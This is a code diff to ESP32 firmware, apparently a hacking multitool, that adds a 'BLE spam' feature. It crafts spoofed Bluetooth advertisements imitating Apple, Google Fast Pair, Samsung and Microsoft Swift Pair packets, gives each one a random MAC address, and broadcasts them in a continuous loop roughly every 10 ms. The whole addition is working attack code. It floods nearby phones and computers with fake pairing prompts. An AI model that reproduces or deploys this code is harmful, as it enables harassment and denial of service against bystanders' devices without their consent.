@@ -8,6 +8,7 @@
 #include "nimble/nimble_port.h"
 #include "host/ble_gap.h"
 #include "managers/ble_manager.h"
+#include "esp_random.h"
 #include "nimble/nimble_port_freertos.h"
 #include <managers/rgb_manager.h>
 
@@ -34,6 +35,222 @@ static void notify_handlers(struct ble_gap_event *event, int len) {
         if (handlers[i].handler) {
             handlers[i].handler(event, len);
         }
+    }
+}
+
+static uint8_t get_random_action_type() {
+    const uint8_t types[] = { 0x24, 0x24, 0x24, 0x24, 0x24, 0x24, 0x24, 0x24, 0x24, 0x24, 0x24 }; // TODO ADD MORE TYPES
+    return types[esp_random() % (sizeof(types) / sizeof(types[0]))];
+}
+
+static int8_t generate_random_rssi() {
+    return (esp_random() % 121) - 100;
+}
+
+static void generate_random_name(char *name, size_t max_len) {
+    static const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+    size_t len = (esp_random() % (max_len - 1)) + 1;
+
+    for (size_t i = 0; i < len; i++) {
+        name[i] = charset[esp_random() % (sizeof(charset) - 1)];
+    }
+    name[len] = '\0';
+}
+
+static void generate_random_mac(uint8_t *mac_addr) {
+    for (int i = 0; i < 6; i++) {
+        mac_addr[i] = esp_random() & 0xFF;
+    }
+
+    mac_addr[0] |= 0x02;
+    mac_addr[0] &= 0xFE;
+}
+
+void generate_apple_advertisement(uint8_t *packet, size_t *packet_len) {
+    size_t i = 0;
+
+    
+    packet[i++] = 17 - 1;
+    packet[i++] = 0xFF;      
+    packet[i++] = 0x4C;       
+    packet[i++] = 0x00;      
+    packet[i++] = 0x0F;     
+    packet[i++] = 0x05;     
+    packet[i++] = 0xC1;   
+
+
+    packet[i++] = get_random_action_type();
+
+
+    esp_fill_random(&packet[i], 3);
+    i += 3;
+
+    packet[i++] = 0x00;
+    packet[i++] = 0x00;
+
+    packet[i++] = 0x10;
+
+    esp_fill_random(&packet[i], 3);
+    i += 3;
+
+    *packet_len = i;
+}
+
+
+void generate_google_advertisement(uint8_t *packet, size_t *packet_len) {
+    size_t i = 0;
+
+
+    packet[i++] = 3;       
+    packet[i++] = 0x03;    
+    packet[i++] = 0x2C;   
+    packet[i++] = 0xFE;   
+
+    packet[i++] = 6;
+    packet[i++] = 0x16;
+    packet[i++] = 0x2C; 
+    packet[i++] = 0xFE; 
+    packet[i++] = 0x00; 
+    packet[i++] = 0xB7; 
+    packet[i++] = 0x27;  
+
+    packet[i++] = 2; 
+    packet[i++] = 0x0A;   
+    packet[i++] = generate_random_rssi(); 
+
+
+    *packet_len = i;
+}
+
+void generate_samsung_advertisement(uint8_t *packet, size_t *packet_len, bool use_watch_model) {
+    if (use_watch_model) {
+        uint8_t model = esp_random() & 0xFF;;
+        size_t i = 0;
+
+        packet[i++] = 14;
+        packet[i++] = 0xFF;
+        packet[i++] = 0x75;
+        packet[i++] = 0x00;
+        packet[i++] = 0x01;
+        packet[i++] = 0x00;
+        packet[i++] = 0x02;
+        packet[i++] = 0x00;
+        packet[i++] = 0x01;
+        packet[i++] = 0x01;
+        packet[i++] = 0xFF;
+        packet[i++] = 0x00;
+        packet[i++] = 0x00;
+        packet[i++] = 0x43;
+        packet[i++] = model;
+
+        *packet_len = 15;
+    } else {
+        uint8_t advertisementPacket[] = {
+            0x02, 0x01, 0x18, 0x1B, 0xFF, 0x75, 0x00, 0x42, 0x09, 0x81, 0x02, 0x14,
+            0x15, 0x03, 0x21, 0x01, 0x09, 0xEF, 0x0C, 0x01, 0x47, 0x06, 0x3C, 0x94, 0x8E,
+            0x00, 0x00, 0x00, 0x00, 0xC7, 0x00
+        };
+
+        memcpy(packet, advertisementPacket, sizeof(advertisementPacket));
+        *packet_len = sizeof(advertisementPacket);
+    }
+}
+
+void generate_microsoft_advertisement(uint8_t *packet, size_t *packet_len) {
+    char random_name[15];
+    generate_random_name(random_name, sizeof(random_name));
+
+    uint8_t name_len = strlen(random_name);
+    size_t i = 0;
+
+    
+    packet[i++] = 7 + name_len - 1; 
+    packet[i++] = 0xFF;              
+    packet[i++] = 0x06;              
+    packet[i++] = 0x00;              
+    packet[i++] = 0x03;             
+    packet[i++] = 0x00;             
+    packet[i++] = 0x80;              
+
+    
+    memcpy(&packet[i], random_name, name_len);
+    i += name_len;
+
+    
+    *packet_len = i;
+}
+
+void generate_advertisement_packet(company_type_t company, uint8_t *packet, size_t *packet_len) {
+    uint16_t company_id = 0;
+    uint8_t manufacturer_data[6] = {0};
+
+
+    switch (company) {
+        case COMPANY_APPLE:
+            generate_apple_advertisement(packet, packet_len);
+            break;
+        case COMPANY_GOOGLE:
+            generate_google_advertisement(packet, packet_len);
+            break;
+        case COMPANY_SAMSUNG:
+            generate_samsung_advertisement(packet, packet_len, true);
+            break;
+        case COMPANY_MICROSOFT:
+            generate_microsoft_advertisement(packet, packet_len);
+            break;
+        default:
+            ESP_LOGE(TAG_BLE, "Unknown company type");
+            return;
+    }
+
+}
+
+void send_ble_advertisement(company_type_t company) {
+    uint8_t adv_data[31] = {0};
+    size_t adv_len = 0;
+
+    
+    uint8_t random_mac[6];
+    generate_random_mac(random_mac);
+
+    
+    generate_advertisement_packet(company, adv_data, &adv_len);
+
+    
+    struct ble_gap_adv_params adv_params = {0};
+    adv_params.conn_mode = BLE_GAP_CONN_MODE_NON;  // Non-connectable advertisement
+    adv_params.disc_mode = BLE_GAP_DISC_MODE_GEN;  // General discoverable mode
+
+    
+    struct ble_hs_adv_fields fields = {0};
+    fields.mfg_data = adv_data;
+    fields.mfg_data_len = adv_len;
+
+   
+    int rc = ble_gap_adv_set_fields(&fields);
+    if (rc != 0) {
+        ESP_LOGE(TAG_BLE, "Error setting advertisement fields; rc=%d", rc);
+        return;
+    }
+
+    
+    rc = ble_gap_adv_start(BLE_OWN_ADDR_PUBLIC, random_mac, BLE_HS_FOREVER, &adv_params, NULL, NULL);
+    if (rc != 0) {
+        ESP_LOGE(TAG_BLE, "Error starting advertisement; rc=%d", rc);
+    } else {
+        ESP_LOGI(TAG_BLE, "Advertisement started with random MAC: %02x:%02x:%02x:%02x:%02x:%02x",
+                 random_mac[0], random_mac[1], random_mac[2], random_mac[3], random_mac[4], random_mac[5]);
+    }
+
+    
+    vTaskDelay(pdMS_TO_TICKS(1000));
+
+    
+    rc = ble_gap_adv_stop();
+    if (rc != 0) {
+        ESP_LOGE(TAG_BLE, "Error stopping advertisement; rc=%d", rc);
+    } else {
+        ESP_LOGI(TAG_BLE, "Advertisement stopped.");
     }
 }
 
@@ -292,6 +509,30 @@ void airtag_scanner_callback(struct ble_gap_event *event, size_t len) {
     }
 }
 
+void ble_spam_task(void *param)
+{
+    company_type_t company = *(company_type_t*)param;
+
+    rgb_manager_set_color(&rgb_manager, 0, 0, 0, 255, false);
+
+    while (1)
+    {
+        send_ble_advertisement(company);
+
+        vTaskDelay(pdMS_TO_TICKS(10));
+    }
+}
+
+void ble_start_spam(company_type_t company) {
+    if (!ble_spam_task_running) {
+        ESP_LOGI(TAG_BLE, "Starting BLE transmission...");
+        xTaskCreate(ble_spam_task, "ble_spam_task", 2048, (void *)&company, 5, &ble_spam_task_handle);
+        ble_spam_task_running = true;
+    } else {
+        ESP_LOGW(TAG_BLE, "BLE transmission already running.");
+    }
+}
+
 void nimble_host_task(void *param) {
     nimble_port_run();
     nimble_port_freertos_deinit();
@@ -350,7 +591,6 @@ esp_err_t ble_unregister_handler(ble_data_handler_t handler) {
     return ESP_ERR_NOT_FOUND;
 }
 
-
 void ble_init(void) {
     nvs_flash_init();
     nimble_port_init();
@@ -367,6 +607,18 @@ void ble_start_find_flippers(void)
 }
 
 void ble_stop_scanning(void) {
+
+    if (ble_spam_task_running) {
+        ESP_LOGI(TAG_BLE, "Stopping beacon transmission...");
+        if (ble_spam_task_handle != NULL) {
+            vTaskDelete(ble_spam_task_handle);
+            ble_spam_task_handle = NULL;
+            ble_spam_task_running = false;
+        }
+    } else {
+        ESP_LOGW(TAG_BLE, "No beacon transmission is running.");
+    }
+
     if (last_company_id != NULL) {
         free(last_company_id);
         last_company_id = NULL;
